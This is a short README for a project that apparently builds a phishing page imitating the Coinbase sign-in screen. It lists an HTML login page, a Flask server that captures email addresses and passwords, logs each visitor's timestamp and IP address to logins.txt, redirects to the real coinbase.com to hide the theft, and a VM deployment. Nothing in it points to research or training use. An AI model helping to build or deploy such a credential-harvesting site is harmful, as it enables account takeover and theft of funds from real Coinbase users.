# Front End Login Page

## Overview
A static front-end login page styled to resemble a Coinbase sign-in interface. Built with plain HTML, Tailwind CSS (via CDN), and Font Awesome icons.

## Project Structure
- `index.html` - Main login page
- `server.py` - Flask backend for handling logins (port 5000)
- `logins.txt` - File where captured login information is stored
- `front end login` - Original source file (kept for reference)

## Running
The project runs via a Flask server on port 5000:
```
python server.py
```

## Features
- Captures Email and Password
- Logs Timestamp and IP Address
- Redirects to coinbase.com after form submission

## Deployment
Configured as a VM deployment running the Flask server.
